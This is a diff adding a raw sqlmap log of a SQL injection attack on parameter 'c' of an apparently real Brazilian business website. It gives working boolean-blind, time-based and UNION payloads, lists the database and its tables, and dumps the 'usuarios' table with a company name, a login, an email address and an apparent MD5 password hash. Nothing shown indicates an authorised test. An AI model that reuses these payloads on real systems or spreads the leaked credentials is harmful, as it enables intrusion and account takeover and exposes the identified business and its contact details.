@@ -1,0 +1,99 @@
+sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
+---
+Parameter: c (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: c=(SELECT (CASE WHEN (3844=3844) THEN 6 ELSE (SELECT 2792 UNION SELECT 6515) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: c=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: c=-7300 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6b7871,0x5967764377626f6e445a6d687058466b736a4348727474744d696b626b4842576e69596849526173,0x716a6a6271)-- iNSG
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] escmalkodb
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: c (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: c=(SELECT (CASE WHEN (3844=3844) THEN 6 ELSE (SELECT 2792 UNION SELECT 6515) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: c=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: c=-7300 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6b7871,0x5967764377626f6e445a6d687058466b736a4348727474744d696b626b4842576e69596849526173,0x716a6a6271)-- iNSG
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: escmalkodb
+[8 tables]
++------------+
+| banners    |
+| downloads  |
+| links      |
+| noticias   |
+| nova_senha |
+| novidades  |
+| textos     |
+| usuarios   |
++------------+
+
+Database: escmalkodb
++-----------+---------+
+| Table     | Entries |
++-----------+---------+
+| novidades | 204     |
+| noticias  | 30      |
+| downloads | 8       |
+| textos    | 4       |
+| links     | 3       |
+| banners   | 1       |
+| usuarios  | 1       |
++-----------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: c (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: c=(SELECT (CASE WHEN (3844=3844) THEN 6 ELSE (SELECT 2792 UNION SELECT 6515) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: c=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: c=-7300 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6b7871,0x5967764377626f6e445a6d687058466b736a4348727474744d696b626b4842576e69596849526173,0x716a6a6271)-- iNSG
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: escmalkodb
+Table: usuarios
+[1 entry]
++----------------------+----------------------------------+-----------+------------------------------------------+--------+
+| nome                 | senha                            | login     | email                                    | codigo |
++----------------------+----------------------------------+-----------+------------------------------------------+--------+
+| Escritório Malkowski | 32da51c5343b9c5924bb4bc152018a8d | malkowski | contabilidade@escritoriomalkowski.com.br | 1      |
++----------------------+----------------------------------+-----------+------------------------------------------+--------+
+
